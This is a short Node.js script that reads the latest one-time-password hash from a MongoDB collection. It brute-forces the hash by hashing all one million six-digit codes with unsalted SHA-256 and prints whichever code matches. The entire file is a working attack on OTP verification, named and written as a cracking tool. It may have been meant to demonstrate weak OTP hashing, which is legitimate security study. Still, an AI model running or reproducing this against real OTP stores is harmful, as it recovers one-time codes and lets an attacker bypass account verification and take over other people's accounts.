import mongoose from "mongoose";
import dotenv from "dotenv";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
dotenv.config({ path: path.join(__dirname, ".env") });

const otpSchema = new mongoose.Schema({
  contact: String,
  otpHash: String,
  expiresAt: Date,
});

const Otp = mongoose.model("Otp", otpSchema);

export const hashOTP = (otp) => {
  return crypto.createHash("sha256").update(otp).digest("hex");
};

async function crack() {
  await mongoose.connect(process.env.MONGO_URI);
  const latest = await Otp.findOne().sort({ expiresAt: -1 });
  if (!latest) {
    console.log("No record");
    await mongoose.disconnect();
    return;
  }

  const target = latest.otpHash;
  console.log("Cracking hash:", target);

  for (let i = 0; i <= 999999; i++) {
    const candidate = i.toString().padStart(6, '0');
    if (hashOTP(candidate) === target) {
      console.log("FOUND_OTP:", candidate);
      break;
    }
  }
  await mongoose.disconnect();
}

crack();
